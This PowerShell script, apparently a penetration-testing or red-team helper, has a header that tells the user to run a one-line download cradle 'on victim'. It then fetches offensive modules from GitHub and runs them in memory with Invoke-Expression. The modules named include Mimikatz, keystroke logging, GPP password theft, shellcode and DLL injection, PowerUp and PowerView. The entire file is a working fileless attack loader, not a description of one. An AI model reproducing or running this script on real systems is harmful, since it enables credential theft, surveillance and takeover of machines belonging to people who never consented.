<#
=====================================================================================
Most Useful PowerSploit and PowerTools Modules that can be loaded into memory
Use this line in PowerShell on victim to pull into memory the modules
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/in-memory-downloader.ps1')|iex
=====================================================================================
#>
$downloadcradle = New-Object Net.WebClient
$modules = @(
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1','https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1','https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1','https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1')
#Build the download command line iterate through modules and import
ForEach ($module in $modules) {
$command = $($downloadcradle).DownloadString($($module))
Invoke-Expression $command
}
Write-Host
Write-Host 'The following modules were imported into this PowerShell session;'
Write-Host
Write-Host '########################################################################################################'
Write-Output $modules
Write-Host '########################################################################################################'
Write-Host
Write-Host 'For detailed help on each use 'Get-Help ModuleName' ie "Get-Help Invoke-AllChecks -Full", as sample shown below.'
Write-Host
Get-Help Invoke-AllChecks -Full
